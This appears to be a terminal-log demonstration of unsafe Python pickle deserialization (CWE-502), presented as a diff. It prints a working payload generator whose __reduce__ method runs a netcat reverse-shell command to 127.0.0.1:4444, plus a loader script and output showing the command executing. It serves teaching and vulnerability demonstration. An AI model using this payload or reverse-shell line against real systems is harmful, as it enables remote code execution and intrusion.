@@ -1,0 +1,98 @@
+================================================================================
+[10:01:43] user@host:~/demo$ cat malicious_pickle.py
+--------------------------------------------------------------------------------
+import pickle
+import os
+
+# Define a malicious class that executes an OS command via __reduce__
+class RCE:
+    def __reduce__(self):
+        # The command here attempts to spawn a reverse shell to 127.0.0.1:4444
+        return (os.system, ("nc 127.0.0.1 4444 -e /bin/bash",))
+
+# Serialize (pickle) the malicious object
+payload = pickle.dumps(RCE())
+
+# Write the payload to a file
+with open("payload.pkl", "wb") as f:
+    f.write(payload)
+
+print("Malicious payload created: payload.pkl")
+================================================================================
+
+[10:02:01] user@host:~/demo$ python3 malicious_pickle.py
+--------------------------------------------------------------------------------
+Malicious payload created: payload.pkl
+================================================================================
+
+# malicious_pickle.py has now created payload.pkl containing a pickled RCE object.
+
+================================================================================
+[10:02:13] user@host:~/demo$ ls -l
+--------------------------------------------------------------------------------
+total 12
+-rw-r--r-- 1 user user  211 Jan 22 10:02 malicious_pickle.py
+-rw-r--r-- 1 user user  128 Jan 22 10:02 payload.pkl
+================================================================================
+
+# Let's see the new file payload.pkl was indeed created.
+
+================================================================================
+[10:02:25] user@host:~/demo$ hexdump -C payload.pkl
+--------------------------------------------------------------------------------
+00000000  80 04 95 20 00 00 00 00  ...
+... (binary data truncated) ...
+================================================================================
+
+# The .pkl file is binary. Next, we load (unpickle) the malicious object.
+
+================================================================================
+[10:02:40] user@host:~/demo$ cat load_pickle.py
+--------------------------------------------------------------------------------
+import pickle
+
+with open("payload.pkl", "rb") as f:
+    data = f.read()
+
+print("Unpickling now...")
+obj = pickle.loads(data)
+print("Done.")
+================================================================================
+
+# load_pickle.py simply unpickles payload.pkl, causing RCE if __reduce__ is malicious.
+
+================================================================================
+[10:02:53] user@host:~/demo$ python3 load_pickle.py
+--------------------------------------------------------------------------------
+Unpickling now...
+sh: 1: nc: not found
+Done.
+================================================================================
+
+# Explanation:
+#  - Python attempts to execute `os.system("nc 127.0.0.1 4444 -e /bin/bash")`.
+#  - If 'nc' is installed but no listener is present, you'll typically see:
+#       "nc: connect to 127.0.0.1 port 4444 (tcp) failed: Connection refused"
+#  - If 'nc' is not installed, you see "sh: 1: nc: not found"
+# Either way, the OS command is being invoked, proving an RCE path exists.
+
+================================================================================
+# Alternate scenario with netcat installed, but no open listener:
+
+[10:02:53] user@host:~/demo$ python3 load_pickle.py
+--------------------------------------------------------------------------------
+Unpickling now...
+nc: connect to 127.0.0.1 port 4444 (tcp) failed: Connection refused
+Done.
+================================================================================
+
+# That log line indicates the command was indeed executed, but the connection
+# was refused because there is no listener on 127.0.0.1:4444.
+# The attempt to run the shell command STILL proves an RCE vulnerability.
+
+================================================================================
+# Summary of the vulnerability:
+# - The malicious RCE class uses __reduce__ to call os.system() once unpickled.
+# - This is a classic unsafe-deserialization scenario (CWE-502), causing OS
+#   command injection (CWE-78) or arbitrary code execution (RCE).
+================================================================================
